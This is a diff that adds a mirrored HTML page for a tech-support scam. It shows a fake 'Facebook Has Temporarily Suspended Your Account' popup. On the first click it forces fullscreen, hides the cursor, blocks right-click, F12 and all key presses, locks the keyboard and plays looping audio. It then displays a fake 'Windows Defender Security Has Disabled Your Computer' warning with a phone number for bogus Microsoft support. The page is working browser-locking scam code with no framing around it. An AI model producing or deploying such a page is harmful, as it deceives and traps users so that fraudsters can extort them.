@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from flippa-d9ahc2graddfh3ec.z03.azurefd.net/new1/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Apr 2026 15:25:03 GMT -->
+<head>
+    <meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>App Suspended</title>
+    <style>
+        body {
+            background-image: url('images/1.png');
+            background-size: 100% 100%;
+            background-repeat: no-repeat;
+            background-position: center center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+
+        body.g {
+            background-image: url('images/2.png');
+        }
+
+        body.fullscreen {
+            background-image: url('images/3.jpg');
+        }
+
+        #support-text {
+            position: absolute;
+            top: 80%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 24px;
+            text-align: center;
+            width: 100%;
+            font-weight: bold;
+            color: black;
+            display: none;
+        }
+
+        #support-text span {
+            font-weight: normal;
+        }
+
+        #music {
+            display: none;
+        }
+
+        #modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+        }
+
+        #modal-content {
+            background-color: white;
+            border-radius: 5px;
+            max-width: 400px;
+            margin: 100px auto;
+            padding: 20px;
+            text-align: center;
+        }
+
+        #modal-close {
+            cursor: pointer;
+            color: #888;
+            float: right;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        #modal-message {
+            color: black;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        #modal-image {
+            margin-bottom: 20px;
+        }
+
+        .modal-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .modal-buttons button {
+            width: 100px;
+            padding: 10px 0;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        .modal-buttons button.accept {
+            background-color: white;
+            color: black;
+        }
+
+        .modal-buttons button.dismiss {
+            background-color: #3b5998;
+            color: white;
+        }
+
+        .modal-buttons button:hover {
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+
+        @keyframes blink {
+            0% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        .modal-buttons button.dismiss.blinking {
+            animation: blink 1s infinite;
+        }
+
+        #welcomeDiv {
+            display: none;
+            background-color: #000;
+            height: auto;
+            width: 550px;
+            position: fixed;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 9999999999;
+            text-align: center;
+        }
+
+        #welcomeDiv p {
+            color: #FEFEFE;
+            margin-top: 10px;
+            font-size: 16px;
+            opacity: 0.9;
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var isPopupVisible = true;
+            var music = document.getElementById('music');
+            var isPlaying = false;
+
+            function toggleMusic() {
+                if (isPlaying) {
+                    music.pause();
+                } else {
+                    music.play();
+                }
+                isPlaying = !isPlaying;
+            }
+
+            function playMusicOnClick() {
+                toggleMusic();
+                document.removeEventListener('click', playMusicOnClick);
+            }
+
+            music.addEventListener('click', toggleMusic);
+            document.addEventListener('click', playMusicOnClick);
+
+            var fullscreenEnabled = document.fullscreenEnabled || document.mozFullScreenEnabled || document.documentElement.webkitRequestFullScreen;
+
+            if (fullscreenEnabled) {
+                document.documentElement.requestFullscreen = document.documentElement.requestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.webkitRequestFullScreen;
+                document.cancelFullscreen = document.cancelFullscreen || document.mozCancelFullScreen || document.webkitCancelFullScreen;
+
+                var isFullscreen = false;
+
+                document.addEventListener('click', function () {
+                    if (!isFullscreen) {
+                        isFullscreen = true;
+                        document.documentElement.requestFullscreen();
+                        document.body.classList.add('fullscreen');
+                        showWelcomeDiv();
+                        showSupportText();
+                    }
+                });
+
+                document.addEventListener('fullscreenchange', function () {
+                    isFullscreen = !isFullscreen;
+                });
+            }
+
+            var modalOverlay = document.getElementById('modal-overlay');
+            var modalClose = document.getElementById('modal-close');
+
+            function showModal() {
+                modalOverlay.style.display = 'block';
+            }
+
+            function closeModal() {
+                modalOverlay.style.display = 'none';
+            }
+
+            modalClose.addEventListener('click', closeModal);
+
+            showModal();
+
+            function hideCursor() {
+                document.documentElement.style.cursor = 'none';
+            }
+
+            document.addEventListener('click', function () {
+                hideCursor();
+                document.removeEventListener('click', hideCursor);
+                if (isPopupVisible) {
+                    closeModal();
+                    isPopupVisible = false;
+                }
+            });
+
+            var acceptButton = document.getElementById('modal-accept');
+            var dismissButton = document.getElementById('modal-dismiss');
+
+            acceptButton.addEventListener('click', closeModal);
+            dismissButton.addEventListener('click', closeModal);
+
+            document.addEventListener('contextmenu', function (event) {
+                event.preventDefault();
+            });
+
+            function preventKeyEvents(event) {
+                const blockedKeyCodes = [123];
+                const keyCode = event.keyCode || event.which;
+
+                if (blockedKeyCodes.includes(keyCode)) {
+                    event.preventDefault();
+                    console.log(`Key with code ${keyCode} is blocked.`);
+                }
+            }
+
+            window.addEventListener('keydown', preventKeyEvents);
+        });
+
+        navigator.keyboard.lock();
+        document.onkeydown = function (e) {
+            return false;
+        }
+
+        function showWelcomeDiv() {
+            var welcomeDiv = document.getElementById('welcomeDiv');
+            welcomeDiv.style.display = 'block';
+        }
+
+        function showSupportText() {
+            var supportText = document.getElementById('support-text');
+            supportText.style.display = 'block';
+        }
+    </script>
+</head>
+<body>
+<audio id="music" src="media/audio.mp3" controls="" loop=""></audio>
+<div id="modal-overlay" style="display: block;">
+    <div id="modal-content">
+        <span id="modal-close">×</span>
+        <img id="modal-image" src="images/fb.jpg" alt="Facebook Logo">
+        <p id="modal-message">Facebook Has Temporarily Suspended Your Account.</p>
+        <div class="modal-buttons">
+            <button id="modal-accept" class="accept">Accept</button>
+            <button id="modal-dismiss" class="dismiss blinking">Ignore</button>
+        </div>
+    </div>
+</div>
+<div id="welcomeDiv">
+    <p>
+        Windows Defender Security Has Disabled Your Computer.<br>
+        Please Contact Microsoft Windows Support To Unlock Your Computer.<br> Toll Free <strong id="t1">833-371-8344</strong>
+    </p>
+</div>
+<div id="support-text">Call Microsoft Windows Support Toll Free : <strong id="t2">833-371-8344</strong></div>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"b9e06d8f0e2a421a8f74d89297b1b6b9","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+
+<!-- Mirrored from flippa-d9ahc2graddfh3ec.z03.azurefd.net/new1/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Apr 2026 15:25:05 GMT -->
+</html>
